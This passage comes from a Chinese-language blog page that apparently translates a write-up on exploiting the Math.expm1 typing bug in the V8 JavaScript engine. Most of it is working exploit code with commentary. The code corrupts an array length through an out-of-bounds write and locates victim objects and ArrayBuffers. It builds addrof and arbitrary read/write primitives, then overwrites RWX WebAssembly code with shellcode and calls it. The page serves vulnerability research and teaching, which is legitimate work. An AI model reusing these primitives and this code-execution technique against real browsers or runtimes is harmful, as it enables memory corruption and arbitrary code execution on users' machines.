+<figure class="highlight bash" data-code="bGV0IG5ld19zaXplID0gKG5ldyBJbnQ2NCgiN2ZmZmZmZmYwMDAwMDAwMCIpKS5hc0RvdWJsZSgpCmZvciAobGV0IGkgPSA0OyBpIDwgMjA7IGkrKykgewogICAgbGV0IHZhbCA9IGFbYippXTsKICAgIGxldCBpc19iYWNraW5nID0gYVtiKihpKzEpXSA9PT0gMC40OwogICAgbGV0IG9yaWdfc2l6ZSA9IEludDY0LmZyb21Eb3VibGUodmFsKS50b1N0cmluZygpOwogICAgbGV0IGdvb2QgPSAob3JpZ19zaXplID09PSAiMHgwMDAwMDAwMjAwMDAwMDAwIiAmJiAhaXNfYmFja2luZyk7CiAgICBhW2IqaSpnb29kXSA9IG5ld19zaXplOwogICAgaWYgKGdvb2QpCiAgICAgICAgYnJlYWs7Cn0K"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> new_size = (new Int64(<span class="string">&quot;7fffffff00000000&quot;</span>)).asDouble()</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 4; i &lt; 20; i++) &#123;</span><br><span class="line">    <span class="built_in">let</span> val = a[b*i];</span><br><span class="line">    <span class="built_in">let</span> is_backing = a[b*(i+1)] === 0.4;</span><br><span class="line">    <span class="built_in">let</span> orig_size = Int64.fromDouble(val).toString();</span><br><span class="line">    <span class="built_in">let</span> good = (orig_size === <span class="string">&quot;0x0000000200000000&quot;</span> &amp;&amp; !is_backing);</span><br><span class="line">    a[b*i*good] = new_size;</span><br><span class="line">    <span class="keyword">if</span> (good)</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>仔细看看这个。正如前面所说的，不能让它只在最后的-0调用时使用一个标记来破坏，所以它的结构在优化循环期间是无害的。然而，这将浪费循环，所以将循环迭代降低到10k(仍然足够优化)，以防止它变得太慢。</p>
+<p>从第一个OOB索引(4)迭代到某个任意的限制(20)。当在当前索引处找到JSArray的长度时，布尔值good将为true。首先，检查当前索引处的值是否为2。由于对齐和字大小的差异，长度左移了32位。值2可以出现在两个地方: JSArray长度和相应的FixedArray长度。对JSArray感兴趣。知道FixedArray的长度后面跟着第一个元素(0.4)，所以通过查看下一个索引，可以确定是找到了JSArray还是FixedArray支持。最后，有两件事会发生a[b<em>i</em>good] &#x3D; new_size:</p>
+<ul>
+<li><p>如果在优化循环中(b为false)或者没有查看JSArray的长度(good为false)，它将赋值给[0]，这是无害的;</p>
+</li>
+<li><p>如果查看JSArray的长度，它将被设置为一个较大的值 (0x7fffffff).</p>
+</li>
+</ul>
+<p>一旦从-0调用返回，将(希望)在arrs中有一个长度损坏的数组，并且可以找到它:</p>
+<figure class="highlight bash" data-code="bGV0IG9vYl9hcnIgPSBudWxsOwpmb3IgKGxldCBpID0gMDsgaSA8IGFycnMubGVuZ3RoOyBpKyspIHsKICAgIGlmIChhcnJzW2ldLmxlbmd0aCAhPT0gMikgewogICAgICAgIG9vYl9hcnIgPSBhcnJzW2ldOwogICAgICAgIGJyZWFrOwogICAgfQp9Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> oob_arr = null;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; arrs.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arrs[i].length !== 2) &#123;</span><br><span class="line">        oob_arr = arrs[i];</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在是时候使用OOB数组来查找受害者对象，以及它的obj属性所在的OOB数组中的索引了。这是一个两步的过程。首先，寻找0x41414141标记属性，并将其更改为一个不同的值(0x42424242)。下一个索引是obj属性。</p>
+<figure class="highlight bash" data-code="bGV0IHZpY3RpbV9vYmogPSBudWxsOwpsZXQgdmljdGltX29ial9pZHhfb2JqID0gbnVsbDsKZm9yIChsZXQgaSA9IDA7IGkgPCAxMDA7IGkrKykgewogICAgbGV0IHZhbCA9IEludDY0LmZyb21Eb3VibGUob29iX2FycltpXSkudG9TdHJpbmcoKTsKICAgIGlmICh2YWwgPT09ICIweDQxNDE0MTQxMDAwMDAwMDAiKSB7CiAgICAgICAgb29iX2FycltpXSA9IChuZXcgSW50NjQoIjQyNDI0MjQyMDAwMDAwMDAiKSkuYXNEb3VibGUoKTsKICAgICAgICB2aWN0aW1fb2JqX2lkeF9vYmogPSBpICsgMTsKICAgICAgICBicmVhazsKICAgIH0KfQo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> victim_obj = null;</span><br><span class="line"><span class="built_in">let</span> victim_obj_idx_obj = null;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; 100; i++) &#123;</span><br><span class="line">    <span class="built_in">let</span> val = Int64.fromDouble(oob_arr[i]).toString();</span><br><span class="line">    <span class="keyword">if</span> (val === <span class="string">&quot;0x4141414100000000&quot;</span>) &#123;</span><br><span class="line">        oob_arr[i] = (new Int64(<span class="string">&quot;4242424200000000&quot;</span>)).asDouble();</span><br><span class="line">        victim_obj_idx_obj = i + 1;</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于有不同的标记，可以在obs中找到受害者对象(通过oob_arr的obj索引是受害者obj_obj_idx_obj):</p>
+<figure class="highlight bash" data-code="Zm9yIChsZXQgaSA9IDA7IGkgPCBvYmpzLmxlbmd0aDsgaSsrKSB7CiAgICBpZiAob2Jqc1tpXS5tYXJrZXIgPT0gMHg0MjQyNDI0MikgewogICAgICAgIHZpY3RpbV9vYmogPSBvYmpzW2ldOwogICAgICAgIGJyZWFrOwogICAgfQp9Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; objs.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (objs[i].marker == 0x42424242) &#123;</span><br><span class="line">        victim_obj = objs[i];</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样的两步过程也适用于寻找受害者缓冲区。这一次，寻找0x41长度，并将其更改为不同的大尺寸以进行标记(并不需要它那么大，但也没有什么坏处)。后备存储指针紧接在长度之后。</p>
+<figure class="highlight bash" data-code="bGV0IHZpY3RpbV9idWYgPSBudWxsOwpsZXQgdmljdGltX2J1Zl9pZHhfcHRyID0gbnVsbDsKZm9yIChsZXQgaSA9IDA7IGkgPCAxMDA7IGkrKykgewogICAgbGV0IHZhbCA9IEludDY0LmZyb21Eb3VibGUob29iX2FycltpXSkudG9TdHJpbmcoKTsKICAgIGlmICh2YWwgPT09ICIweDAwMDAwMDAwMDAwMDAwNDEiKSB7CiAgICAgICAgb29iX2FycltpXSA9IChuZXcgSW50NjQoIjdmZmZmZmZmIikpLmFzRG91YmxlKCk7CiAgICAgICAgdmljdGltX2J1Zl9pZHhfcHRyID0gaSArIDE7CiAgICAgICAgYnJlYWs7CiAgICB9Cn0K"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> victim_buf = null;</span><br><span class="line"><span class="built_in">let</span> victim_buf_idx_ptr = null;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; 100; i++) &#123;</span><br><span class="line">    <span class="built_in">let</span> val = Int64.fromDouble(oob_arr[i]).toString();</span><br><span class="line">    <span class="keyword">if</span> (val === <span class="string">&quot;0x0000000000000041&quot;</span>) &#123;</span><br><span class="line">        oob_arr[i] = (new Int64(<span class="string">&quot;7fffffff&quot;</span>)).asDouble();</span><br><span class="line">        victim_buf_idx_ptr = i + 1;</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后通过检查长度找到标记的受害者缓冲区:</p>
+<figure class="highlight bash" data-code="Zm9yIChsZXQgaSA9IDA7IGkgPCBidWZzLmxlbmd0aDsgaSsrKSB7CiAgICBpZiAoYnVmc1tpXS5ieXRlTGVuZ3RoICE9PSAweDQxKSB7CiAgICAgICAgdmljdGltX2J1ZiA9IGJ1ZnNbaV07CiAgICAgICAgYnJlYWs7CiAgICB9Cn0K"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; bufs.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (bufs[i].byteLength !== 0x41) &#123;</span><br><span class="line">        victim_buf = bufs[i];</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时，已经拥有了构建原语所需的一切。例如，这是addrof:</p>
+<figure class="highlight bash" data-code="YWRkcm9mKG9iaikgewogICAgdmljdGltX29iai5vYmogPSBvYmo7CiAgICByZXR1cm4gSW50NjQuZnJvbURvdWJsZShvb2JfYXJyW3ZpY3RpbV9vYmpfaWR4X29ial0pOwp9Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addrof(obj) &#123;</span><br><span class="line">    victim_obj.obj = obj;</span><br><span class="line">    <span class="built_in">return</span> Int64.fromDouble(oob_arr[victim_obj_idx_obj]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它将对象引用赋值给受害者对象的obj字段，然后通过OOB数组读取指针。注意，V8中的指针是被标记的，以区别于小整数: 最低位总是被设置的，所以减去1就得到真正的地址。</p>
+<p>这是任意的读&#x2F;写:</p>
+<figure class="highlight bash" data-code="cmVhZChhZGRyLCBzaXplKSB7CiAgICBvb2JfYXJyW3ZpY3RpbV9idWZfaWR4X3B0cl0gPSBhZGRyLmFzRG91YmxlKCk7CiAgICBsZXQgYSA9IG5ldyBVaW50OEFycmF5KHZpY3RpbV9idWYsIDAsIHNpemUpOwogICAgcmV0dXJuIEFycmF5LmZyb20oYSk7Cn0sCndyaXRlKGFkZHIsIGJ5dGVzKSB7CiAgICBvb2JfYXJyW3ZpY3RpbV9idWZfaWR4X3B0cl0gPSBhZGRyLmFzRG91YmxlKCk7CiAgICBsZXQgYSA9IG5ldyBVaW50OEFycmF5KHZpY3RpbV9idWYpOwogICAgYS5zZXQoYnl0ZXMpOwp9Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span>(addr, size) &#123;</span><br><span class="line">    oob_arr[victim_buf_idx_ptr] = addr.asDouble();</span><br><span class="line">    <span class="built_in">let</span> a = new Uint8Array(victim_buf, 0, size);</span><br><span class="line">    <span class="built_in">return</span> Array.from(a);</span><br><span class="line">&#125;,</span><br><span class="line">write(addr, bytes) &#123;</span><br><span class="line">    oob_arr[victim_buf_idx_ptr] = addr.asDouble();</span><br><span class="line">    <span class="built_in">let</span> a = new Uint8Array(victim_buf);</span><br><span class="line">    a.set(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这两种方法的第一行都使用OOB数组来更改受害者缓冲区的后备存储指针。然后，他们在ArrayBuffer的顶部创建一个Uint8Array以字节形式访问内存，并执行读&#x2F;写操作。</p>
+<p>在读写之外，还可以很容易地编写其他专用的原语，以方便使用, 把这个问题留给读者来解决。对于稍后将使用的代码执行漏洞，建议实现read32(读取32位整数)、read64(读取64位Int64)和write64(写入64位Int64)。</p>
+<p>我们的原语现在已经实现并且稳定了。开始执行代码。</p>
+<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><p>显然，NX是启用的，所以不能在 “普通” 内存区域做代码注入。从前，V8的JIT代码页拥有RWX权限。因此，可以简单地结合addrof和read来获取编译函数的代码地址，通过write用shellcode覆盖它，然后调用该函数。不幸的是，现在已经不是这样了<span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9mbGFnLWRlZmluaXRpb25zLmg/cmNsPWRkZTI1ODcyZjU4OTUxYmIwMTQ4Y2Y0M2Q2YTUwNGFiMmYyODA0ODUmbD03MTc=">compilation flag<i class="fa fa-external-link-alt"></i></span>默认情况下，它将通过在RW和RX之间交替编写保护代码。</p>
+<p>顺便说一句，这个标志实际上可以在运行时更改(有一个可写的副本)。能做到吗? 简短的回答: 不要浪费时间，有更好的方法(见下文)。长答案(需要V8内部知识): 标志缓存在堆实例中，可以通过MemoryChunk定位，可以通过从堆对象逐页向后扫描来找到有效的头。然而，更改标志将改变CodeSpaceMemoryModificationScope的语义，并且编译器试图写入RX内存时可能会崩溃。我想，如果让它分配一个新的MemoryChunk(可能通过使用大型代码对象空间?)，它可能会工作，但还必须担心后台编译和反优化, 在我看来很乱。</p>
+<p>显然，唯一的选择是代码重用攻击(例如，ROP)。这将需要一个堆栈枢轴，或者找到一个合适的堆栈帧来损坏。我很懒，我喜欢更好的方式。幸运的是，JavaScript并不是V8中唯一需要编译的语言: 还有WebAssembly.<span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9mbGFnLWRlZmluaXRpb25zLmg/cmNsPWRkZTI1ODcyZjU4OTUxYmIwMTQ4Y2Y0M2Q2YTUwNGFiMmYyODA0ODUmbD01NDM=">write-protect flag<i class="fa fa-external-link-alt"></i></span> 默认为false，因此编译后的WebAssembly代码为RWX。</p>
+<p>可以编译一些WebAssembly代码，并通过addrof获得导出函数的JSFunction对象的地址:</p>
+<figure class="highlight bash" data-code="bGV0IHdhc21fY29kZSA9IG5ldyBVaW50OEFycmF5KFsuLi5dKTsKbGV0IHdhc21fbW9kID0gbmV3IFdlYkFzc2VtYmx5Lkluc3RhbmNlKG5ldyBXZWJBc3NlbWJseS5Nb2R1bGUod2FzbV9jb2RlKSwge30pOwpsZXQgZiA9IHdhc21fbW9kLmV4cG9ydHMuZnVuY3Rpb25fbmFtZTsKbGV0IGZfYWRkciA9IHByaW1zLmFkZHJvZihmKTsK"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> wasm_code = new Uint8Array([...]);</span><br><span class="line"><span class="built_in">let</span> wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), &#123;&#125;);</span><br><span class="line"><span class="built_in">let</span> f = wasm_mod.exports.function_name;</span><br><span class="line"><span class="built_in">let</span> f_addr = prims.addrof(f);</span><br></pre></td></tr></table></figure>
+
+<p>现在，必须从这个JSFunction中获取编译后代码的地址。通过查看JS-to-Wasm包装器是如何内置的，可以找到答案<span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9jb21waWxlci93YXNtLWNvbXBpbGVyLmNjP3JjbD1kZGUyNTg3MmY1ODk1MWJiMDE0OGNmNDNkNmE1MDRhYjJmMjgwNDg1Jmw9NDgzOQ==">wasm-compiler.cc<i class="fa fa-external-link-alt"></i></span> (并经过一些调试)。从JSFunction中，必须读取SharedFunctionInfo指针。然后，从共享的信息中，可以得到一个指向函数data的指针，它的类型是wasmexporttedfunctiondata。这里有需要的两个字段: 指向WasmInstanceObject的指针和函数索引。从WasmInstanceObject中，可以获得跳转表起始点的地址，当将该地址添加到函数索引时，将给出函数跳转表项的地址。它位于RWX代码内存中，是函数的入口点。将保留计算偏移量和将读取链写入阅读器(必须查看一些标题，这并不困难)。</p>
+<p>一旦有了入口点地址，可以向它编写shellcode并调用该函数:</p>
+<figure class="highlight bash" data-code="bGV0IHNoZWxsY29kZSA9IFsweGNjLCAweDQ4LCAweGM3LCAweGMwLCAweDM3LCAweDEzLCAweDAwLCAweDAwXTsKcHJpbXMud3JpdGUoY29kZV9hZGRyLCBzaGVsbGNvZGUpOwpmKCk7Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> shellcode = [0xcc, 0x48, 0xc7, 0xc0, 0x37, 0x13, 0x00, 0x00];</span><br><span class="line">prims.write(code_addr, shellcode);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v86.png"></li>
+</ul>
+<p>完美的结局.</p>
+<h4 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h4><p>这是我触发过的最严重的漏洞。这个漏洞本身是相当标准的 (关于最后一部分，我以前没有见过公开使用WebAssembly，但我相信其他人知道它)，但是愚弄typer绝对是一次冒险。离开的时候，对V8的内部结构有了一定的了解，虽然仍然有限，但已经比刚开始的时候好多了。希望您喜欢阅读这篇文章，尽管它相当长。一次又一次,<span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9fdHN1cm8=">@_tsuro<i class="fa fa-external-link-alt"></i></span>对于第一次发现并利用这个bug: 这是一项可怕的工作!</p>
+<h4 id="译自"><a href="#译自" class="headerlink" title="译自"></a>译自</h4><ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9hYmlvbmRvLm1lLzIwMTkvMDEvMDIvZXhwbG9pdGluZy1tYXRoLWV4cG0xLXY4LyNqYXZhc2NyaXB0LWV4cGxvaXRhdGlvbi1wcmltaXRpdmVz">Exploiting the Math.expm1 typing bug in V8<i class="fa fa-external-link-alt"></i></span><!-- kb:end Exploiting-the-Math-expm1-typing-bug-in-V8 --></li>
+</ul>
+</details>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="253 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="253 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>253
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://lucifer11.xyz/knowledge/v8/" title="V8 类型推断与任意读写原语">https://lucifer11.xyz/knowledge/v8/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="fa fa-stack-exchange"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/V8/" rel="tag"><i class="fa fa-tag"></i> V8</a>
+              <a href="/tags/JIT/" rel="tag"><i class="fa fa-tag"></i> JIT</a>
+              <a href="/tags/%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" rel="tag"><i class="fa fa-tag"></i> 类型混淆</a>
+              <a href="/tags/%E7%9F%A5%E8%AF%86%E5%BA%93/" rel="tag"><i class="fa fa-tag"></i> 知识库</a>
+              <a href="/tags/%E6%8C%87%E9%92%88%E5%8E%8B%E7%BC%A9/" rel="tag"><i class="fa fa-tag"></i> 指针压缩</a>
+              <a href="/tags/%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99/" rel="tag"><i class="fa fa-tag"></i> 任意读写</a>
+              <a href="/tags/%E8%B6%8A%E7%95%8C%E8%AE%BF%E9%97%AE/" rel="tag"><i class="fa fa-tag"></i> 越界访问</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/knowledge/xml/" rel="prev" title="XML 外部实体与二次解释">
+                  <i class="fa fa-chevron-left"></i> XML 外部实体与二次解释
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/knowledge/uploads/" rel="next" title="文件写入、上传验证与后续解析">
+                  文件写入、上传验证与后续解析 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">253</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">696k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">42:11</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
